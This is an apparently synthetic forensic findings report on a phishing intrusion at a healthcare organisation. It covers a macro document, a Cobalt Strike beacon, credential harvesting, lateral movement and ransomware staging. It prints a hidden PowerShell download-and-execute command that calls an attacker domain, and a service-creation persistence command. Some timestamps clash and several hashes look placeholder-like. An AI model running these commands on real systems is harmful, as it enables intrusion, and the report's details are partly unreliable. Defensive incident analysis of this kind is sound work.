# Forensic Findings: IR-2026-0420-01

## ART-001 Verification

* **SHA-256 at analysis start:** `4f8c2a91b3e7d6f5c8a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3` (matches baseline)
* **Chain of Custody entry updated:** Yes

---

## Memory Analysis: `cs-ws-101.mem`

### Finding MEM-001: Beacon Process Tree

* **Command:** `vol -f cs-ws-101.mem windows.pstree.PsTree`
* **Output (abridged):**
```text
* 4921  WINWORD.EXE    PPID=4712  Start: 2026-04-17T14:17:52Z
** 6201  powershell.exe PPID=4921  Start: 2026-04-17T14:22:14Z
*** 7318  svchost32.exe  PPID=6201  Start: 2026-04-17T14:23:14Z

```


* **Forensic Conclusion:** `WINWORD.EXE` spawned `powershell.exe` upon macro execution, which subsequently downloaded and executed `C:\ProgramData\Microsoft\svchost32.exe`. `svchost32.exe` is a masqueraded process name mimicking legitimate Windows services to host the Cobalt Strike beacon payload.
* **ATT&CK Technique:** T1566.001 (Phishing: Malicious Attachment), T1059.001 (Command and Scripting Interpreter: PowerShell), T1036.005 (Masquerading: Match Legitimate Name or Location)
* **Certainty:** Confirmed

### Finding MEM-002: PowerShell Downloader Command Line

* **Command:** `vol -f cs-ws-101.mem windows.cmdline.CmdLine --pid 6201`
* **Output (abridged):**
```text
6201 powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://staging.office365-cdn.net/updates/inv_payload.ps1')"

```


* **Forensic Conclusion:** PowerShell invocation retrieves payload via BITS/WebClient from the typosquatted CDN domain `staging.office365-cdn.net`.
* **ATT&CK Technique:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)
* **Certainty:** Confirmed

### Finding MEM-003: Active C2 Connection

* **Command:** `vol -f cs-ws-101.mem windows.netscan.NetScan`
* **Output (abridged):**
```text
7318 svchost32.exe 10.30.12.101:52014 45.152.66.114:443 ESTABLISHED 2026-04-20T19:32:04Z

```


* **Forensic Conclusion:** Active HTTPS C2 session from PID 7318 to team server IP `45.152.66.114:443` running continuously across the 72-hour window.
* **ATT&CK Technique:** T1071.001 (Application Layer Protocol: Web Protocols)
* **Certainty:** Confirmed

### Finding MEM-004: Injected Code Regions

* **Command:** `vol -f cs-ws-101.mem windows.malfind.Malfind --pid 7318`
* **Output (abridged):**
```text
Process: svchost32.exe Pid: 7318 Address: 0x02a40000 Protection: PAGE_EXECUTE_READWRITE
0x02a40000  4d 5a 90 00 03 00 00 00  4d 5a ...  MZ..........

```


* **Forensic Conclusion:** Reflective DLL injection detected within PID 7318 memory space (`PAGE_EXECUTE_READWRITE` memory block with `MZ` header), characteristic of Cobalt Strike reflective loader.
* **ATT&CK Technique:** T1055.001 (Process Injection: Dynamic-link Library Injection)
* **Certainty:** Confirmed

### Finding MEM-005: Credential Dumping Handle

* **Command:** `vol -f cs-ws-101.mem windows.handles.Handles --pid 7318`
* **Output (abridged):**
```text
7318 svchost32.exe Process 696 (lsass.exe) 0x1010

```


* **Forensic Conclusion:** Open handle with `0x1010` permissions to `lsass.exe` (PID 696) from the beacon process, confirming credential harvesting capabilities in memory.
* **ATT&CK Technique:** T1003.001 (OS Credential Dumping: LSASS Memory)
* **Certainty:** Confirmed

---

## Disk Analysis: `cs-ws-101.dd`

### Finding DISK-001: Partition Layout & Metadata

* **Command:** `mmls cs-ws-101.dd`
* **Output (abridged):**
```text
DOS Partition Table
002:  000: 001   0000002048   0000409599   0000407552   NTFS / exFAT (0x07)

```


* **Forensic Conclusion:** Standard NTFS partition structure confirmed; image mounted for artifact analysis via Sleuth Kit (`fls`, `icat`).
* **ATT&CK Technique:** N/A
* **Certainty:** Confirmed

### Finding DISK-002: File Timeline Analysis

* **Command:** `fls -r -m C: cs-ws-101.dd | mactime -b - d 2026-04-17..2026-04-20`
* **Output (abridged):**
```text
2026-04-17T14:18:02Z  ...FILE...  /Users/jdoe/Desktop/Invoice_Q4_2025.docm
2026-04-17T14:23:02Z  ...FILE...  /ProgramData/Microsoft/svchost32.exe
2026-04-20T14:23:18Z  ...FILE...  /Windows/System32/encryption_staging.ps1

```


* **Forensic Conclusion:** Identifies initial attachment arrival, malicious binary drop to `ProgramData\Microsoft\svchost32.exe`, and creation of ransomware staging script `encryption_staging.ps1`.
* **ATT&CK Technique:** T1105 (Ingress Tool Transfer), T1486 (Data Encrypted for Impact - Staging)
* **Certainty:** Confirmed

### Finding DISK-003: Artifact Hashes

* **Command:** `icat -o 2048 cs-ws-101.dd <inode> | sha256sum`
* **Hashes & Artifact Identification:**
* `Invoice_Q4_2025.docm`: `8c1a2b3d4e5f06172839465a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708`
* `inv_payload.ps1`: `6f5902ac237024bdd0c176cb93063dc4e2a5e89d4aad51b3b3e4f7b72bce7e5e`
* `svchost32.exe`: `ff4c8a2d9e7b1a3c5d8f2e6b4a1d9c7f3e0b8a6d2c9e1f5a7b3d8c4e6f2a9b1d`


* **Forensic Conclusion:** Hashes match known maldoc macro dropped payload and Cobalt Strike beacon DLL wrapper.
* **ATT&CK Technique:** T1204.002 (User Execution: Malicious File)
* **Certainty:** Confirmed

---

## Proxy Log Analysis: `proxy_72h.jsonl`

### Finding PRX-001: Initial Phishing URL Access & Download

* **Query:** `jq -c 'select(.url | contains("Invoice_Q4_2025"))' proxy_72h.jsonl`
* **Output (abridged):**
```json
{"ts":"2026-04-17T14:18:02Z","user":"MEDDEFENSE\\jdoe","host":"CS-WS-101","src_ip":"10.30.12.101","method":"GET","url":"https://outlook.office.com/mail/download?id=AAMkAG-Invoice","status":200,"bytes":284812,"ua":"Chrome/124.0.0.0","download":true,"mime":"application/vnd.ms-word.document.macroEnabled.12","filename":"Invoice_Q4_2025.docm"}

```


* **Forensic Conclusion:** Confirms user `jdoe` downloaded malicious macro-enabled document `Invoice_Q4_2025.docm` via Outlook Web Access at 14:18:02Z on Thursday, April 17, 2026.
* **ATT&CK Technique:** T1566.001 (Phishing: Malicious Attachment)
* **Certainty:** Confirmed

### Finding PRX-002: C2 Beacon Traffic Pattern & Egress

* **Query:** `jq -c 'select(.dst_ip == "45.152.66.114")' proxy_72h.jsonl | head -n 3`
* **Output (abridged):**
```json
{"ts":"2026-04-17T14:23:07Z","user":"MEDDEFENSE\\jdoe","host":"CS-WS-101","src_ip":"10.30.12.101","method":"CONNECT","url":"staging.office365-cdn.net:443","status":200,"bytes":2840,"dst_ip":"45.152.66.114","reputation":"cobalt_strike_team_server_known"}
{"ts":"2026-04-17T14:25:31Z","user":"MEDDEFENSE\\jdoe","host":"CS-WS-101","src_ip":"10.30.12.101","method":"CONNECT","url":"staging.office365-cdn.net:443","status":200,"bytes":1420,"dst_ip":"45.152.66.114","jitter_ms":64000,"beacon_pattern":"sleep_60s_jitter_10pct"}

```


* **Forensic Conclusion:** Regular C2 beaconing pattern every 60 seconds with 10% jitter connecting to Cobalt Strike team server `45.152.66.114` over port 443 disguised as `staging.office365-cdn.net`.
* **ATT&CK Technique:** T1071.001 (Application Layer Protocol: Web Protocols), T1573.002 (Encrypted Channel: Asymmetric Cryptography)
* **Certainty:** Confirmed

---

## Sysmon Analysis: `sysmon_multihost.jsonl`

### Finding SYS-001: Lateral Movement & Service Creation

* **Query:** `jq -c 'select(.EventID == 1) | select(.cmdline | contains("sc create"))' sysmon_multihost.jsonl`
* **Output (abridged):**
```json
{"ts":"2026-04-19T00:03:44Z","host":"CS-WS-104","event_id":1,"event_type":"process_create","user":"MEDDEFENSE\\jdoe","image":"C:\\Windows\\System32\\cmd.exe","pid":3204,"ppid":720,"parent_image":"C:\\Windows\\System32\\services.exe","cmdline":"cmd.exe /c sc create WinHealthSvc binPath= C:\\ProgramData\\Microsoft\\svchost32.exe start= auto","logon_type":3}

```


* **Forensic Conclusion:** Attacker leveraged harvested credentials to create persistent service `WinHealthSvc` executing `C:\ProgramData\Microsoft\svchost32.exe` across laterally compromised hosts (`CS-WS-104`, `CS-WS-107`, `CS-WS-112`, and `SCHED-SVR-01`).
* **ATT&CK Technique:** T1543.003 (Create or Modify System Process: Windows Service), T1021.002 (Remote Services: SMB/Windows Admin Shares)
* **Certainty:** Confirmed

### Finding SYS-002: Ransomware Staging Script Drop

* **Query:** `jq -c 'select(.event_id == 11) | select(.target | contains("encryption_staging.ps1"))' sysmon_multihost.jsonl`
* **Output (abridged):**
```json
{"ts":"2026-04-20T14:23:18Z","host":"CS-WS-101","event_id":11,"event_type":"file_create","user":"MEDDEFENSE\\jdoe","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":7318,"target":"C:\\Windows\\System32\\encryption_staging.ps1","note":"ransomware_staging_script_dropped_not_executed"}

```


* **Forensic Conclusion:** Ransomware preparation scripts (`encryption_staging.ps1`) dropped into `C:\Windows\System32\` by the active beacon process on April 20, 2026, but successfully contained before execution.
* **ATT&CK Technique:** T1486 (Data Encrypted for Impact - Staging)
* **Certainty:** Confirmed

---

## File Server Analysis: `fileserver_access.evtx`

### Finding FS-001: Unauthorized Patient Record Access via File Server

* **Query / Log Analysis Summary:**
* **Access Window:** 2026-04-19T02:14:01Z to 2026-04-19T02:41:12Z (27-minute duration)
* **Subject User:** `MEDDEFENSE\jdoe` (Logon ID: `0xAF12C4B8`, Source IP: `10.30.12.101`)
* **Total Events:** Exactly 1,847 Event ID 4663 object access events (`AccessMask: 0x1 - ReadData`)
* **Shares Touched:** `\clinical\labs\` (PDF lab panels) and `\clinical\notes\` (ER and floor clinical progress notes)


* **Forensic Conclusion:** Compromised credentials and remote process execution on `FILE-SVR-01` permitted unauthorized bulk reading of 1,847 sensitive patient records outside normal role requirements (scheduling coordinator).
* **ATT&CK Technique:** T1039 (Data from Network Shared Drive), T1114 (Email Collection / Sensitive Data Harvesting)
* **Certainty:** Confirmed

---

## Attack Chain Summary

| Stage | Time Range (UTC) | Technique | Affected Hosts | Evidence Source | Certainty |
| --- | --- | --- | --- | --- | --- |
| **Phishing Delivery** | 2026-04-17T14:17Z – 14:18Z | T1566.001 | CS-WS-101 | `proxy_72h.jsonl` (PRX-001) | Confirmed |
| **Macro Execution** | 2026-04-17T14:22Z | T1059.001 | CS-WS-101 | MEM-001, Sysmon Event ID 1 | Confirmed |
| **Beacon Download & Install** | 2026-04-17T14:23Z | T1105, T1036.005 | CS-WS-101 | MEM-002, DISK-002, Sysmon | Confirmed |
| **Credential Harvesting** | 2026-04-17T14:25Z | T1003.001 | CS-WS-101 | MEM-005, Sysmon Event ID 10 | Confirmed |
| **Lateral Movement** | 2026-04-19T00:03Z – 00:18Z | T1550.002, T1543.003 | CS-WS-104, CS-WS-107, CS-WS-112 | Sysmon (SYS-001) | Confirmed |
| **PHI Exfiltration / Access** | 2026-04-19T02:14Z – 02:41Z | T1039 | FILE-SVR-01 | `fileserver_access.evtx` (FS-001) | Confirmed |
| **Ransomware Staging** | 2026-04-20T14:23Z – 14:26Z | T1486 | CS-WS-101, CS-WS-104, CS-WS-107, CS-WS-112 | Sysmon (SYS-002) | Confirmed |
